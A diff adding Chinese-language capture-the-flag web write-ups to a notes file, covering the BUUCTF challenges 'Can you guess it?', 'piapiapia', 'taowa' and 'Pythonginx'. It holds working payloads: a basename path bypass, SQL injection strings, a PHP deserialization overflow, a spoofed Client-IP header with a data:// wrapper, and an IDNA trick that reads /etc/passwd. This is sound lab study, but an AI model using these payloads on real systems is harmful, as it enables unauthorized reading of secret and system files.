@@ -936,6 +936,242 @@ if(isset($_GET['exp'])){
 ```sh
 GET /?exp=show_source(array_rand(array_flip(scandir(pos(localeconv()))))); HTTP/1.1
 ```
+### [Can you guess it?](https://buuoj.cn/challenges#[Zer0pts2020]Can%20you%20guess%20it?)
+```php
+<?php
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST['guess'])) {
+  $guess = (string) $_POST['guess'];
+  if (hash_equals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Can you guess it?</title>
+  </head>
+  <body>
+    <h1>Can you guess it?</h1>
+    <p>If your guess is correct, I'll give you the flag.</p>
+    <p><a href="?source">Source</a></p>
+    <hr>
+<?php if (isset($message)) { ?>
+    <p><?= $message ?></p>
+<?php } ?>
+    <form action="index.php" method="POST">
+      <input type="text" name="guess">
+      <input type="submit">
+    </form>
+  </body>
+</html>
+```
+
+
+```sh
+POST /index.php/config.php%20?source HTTP/1.1
+
+:  highlight_file(config.php ): failed to open stream: No such file or directory in <b>/var/www/html/index.php
+```
+
+basename可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录
+```sh
+GET /index.php/config.php/%ff?source 
+```
+### [piapiapia](https://buuoj.cn/challenges#[0CTF%202016]piapiapia)
+```sh
+username=1&password=1'%20or%20'1'='1'#
+
+Invalid user name
+
+username=1'%20or%20'1'='1'&password=1'%20or%20'1'='1'#
+
+Invalid user name or password
+
+username=admin&password=1'%20or%20'1'='1'%20group%20by%203#
+
+Invalid password
+```
+注入无效，使用dirsearch
+```sh
+[14:49:14] Scanning: 
+[15:06:16] 200 -     0B - /config.php
+[15:19:41] 200 -    11B - /profile.php
+[15:20:24] 200 -   797B - /register.php
+[15:25:16] 200 -    11B - /update.php
+[15:27:59] 200 -  392KB - /www.zip
+
+Task Completed
+```
+其中www.zip代码审计，register.php注册，index.php登录，update.php更新，profile.php显示。config.php中有$flag，考虑读取config.php
+```php
+// profile.php
+$photo = base64_encode(file_get_contents($profile['photo']));
+// update.php
+move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+$profile['phone'] = $_POST['phone'];
+$profile['email'] = $_POST['email'];
+$profile['nickname'] = $_POST['nickname'];
+$profile['photo'] = 'upload/' . md5($file['name']);
+
+$user->update_profile($username, serialize($profile));
+// class.php
+public function filter($string) {
+    $escape = array('\'', '\\\\');
+    $escape = '/' . implode('|', $escape) . '/';
+    $string = preg_replace($escape, '_', $string);
+
+    $safe = array('select', 'insert', 'update', 'delete', 'where');
+    $safe = '/' . implode('|', $safe) . '/i';
+    return preg_replace($safe, 'hacker', $string);
+}
+```
+serialize->filter->unserialize, 考虑序列化覆盖，其中长度通过传数组绕过
+```sh
+Content-Disposition: form-data; name="nickname[]"
+```
+由于filter中会把5个关键字替换成'hacker', 其它4个和替换词都是6个字母，只有'where'有覆盖后面的‘photo’的可能。`";}s:5:"photo";s:10:"config.php";}`共34个字符，故需要34个‘where’，'}'后续的额外字符会被完全忽略
+```sh
+a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:5:"1@1.1";s:8:"nickname";s:5:"where";s:5:"photo";s:39:"upload/b0e4bdfca013a84e5f0b9bc9ae028945";}
+
+$user['phone'] = "11111111111";
+$user['email'] = '1@1.1';
+$a=array('wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}');
+//$a = array('wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:5:"/flag";}');
+$user['nickname'] = $a;
+$user['photo'] = 'upload/' . md5('cmd.php');
+
+a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:5:"1@1.1";s:8:"nickname";a:1:{i:0;s:204:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:39:"upload/b0e4bdfca013a84e5f0b9bc9ae028945";}
+```
+### [套娃](https://buuoj.cn/challenges#[MRCTF2020]%E5%A5%97%E5%A8%83)
+```sh
+<!--
+//1st
+$query = $_SERVER['QUERY_STRING'];
+
+ if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
+    die('Y0u are So cutE!');
+}
+ if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
+    echo "you are going to the next ~";
+}
+!-->
+```
+QUERY_STRING是请求URL中问号后面的部分，即查询字符串。PHP的变量命名规则：点号和空格会被转换为下划线
+```sh
+GET /?b.u.p.t=23333%0a HTTP/1.1
+```
+```sh
+FLAG is in secrettw.php
+
+Flag is here~But how to get it?Local access only!<br/>Sorry,you don't have permission!  Your ip is :sorry,this way is banned! 
+```
+```sh
+Client-IP: 127.0.0.1
+```
+jsfuck是一种编程语言，它仅使用六个字符：[, ], (, ), +, ! 来编写JavaScript代码。它是一种混淆技术，可以将任何JavaScript代码转换成仅使用这些字符的表示。
+```
+alert("post me Merak"
+```
+CTF 中 Merak 是一种 CMS 或工具，
+```sh
+POST /secrettw.php HTTP/1.1
+Host: 966c8458-d0ad-42ba-9711-b7b2c7b56472.node5.buuoj.cn:81
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Client-IP: 127.0.0.1
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+Merak=1
+```
+得到secrettw.php的源码
+```php
+function change($v) {
+    $v = base64_decode($v)
+    $re = '';
+    for ($i=0; $i < strlen($v); $i++) {
+        $re .= chr(ord($v[$i]) + $i * 2);
+    }
+    return $re;
+}
+
+file_get_contents($_GET['2333']) === 'todat is a happy day'
+```
+使用data://text/plain;base64,...file传change的逆运算结果
+```sh
+GET /secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&file=ZmpdYSZmXGI= HTTP/1.1
+```
+### [Pythonginx](https://buuoj.cn/challenges#[SUCTF%202019]Pythonginx)
+```py
+@app.route('/getUrl', methods=['GET', 'POST'])
+def getUrl():
+    url = request.args.get("url")
+    host = parse.urlparse(url).hostname
+    if host == 'suctf.cc':
+        return "我扌 your problem? 111"
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == 'suctf.cc':
+        return "我扌 your problem? 222 " + host
+    newhost = []
+    for h in host.split('.'):
+        newhost.append(h.encode('idna').decode('utf-8'))
+    parts[1] = '.'.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(' ')[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == 'suctf.cc':
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return "我扌 your problem? 333"
+```
+IDNA编码会将某些Unicode字符（例如全角句点）转换为标准ASCII点（.），从而改变域名的结构。
+```py
+def check():
+    for x in range(65536):
+        uni=chr(x)
+        url="http://suctf.c{}".format(uni)
+        try:
+            if getUrl(url) == 'suctf.cc':
+                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
+        except:
+            pass
+```
+```sh
+str: ℂ unicode: \u2102
+str: ℭ unicode: \u212d
+str: Ⅽ unicode: \u216d
+str: ⅽ unicode: \u217d
+str: Ⓒ unicode: \u24b8
+str: ⓒ unicode: \u24d2
+str: Ｃ unicode: \uff23
+str: ｃ unicode: \uff43
+```
+0x2102 -> %e2%84%82
+```sh
+GET /getUrl?url=file%3A%2F%2Fsuctf.c%E2%84%82/etc/passwd HTTP/1.1
+```
+会返回500 Internal Server Error......
 
 # SQL类
 ## Basic
@@ -1127,5 +1363,4 @@ GET /?stunum=1/**/and/**/1=1 HTTP/1.1
 GET /?stunum=1/**/and/**/1=2 HTTP/1.1
 ```
 判断是bool注入......
-
 
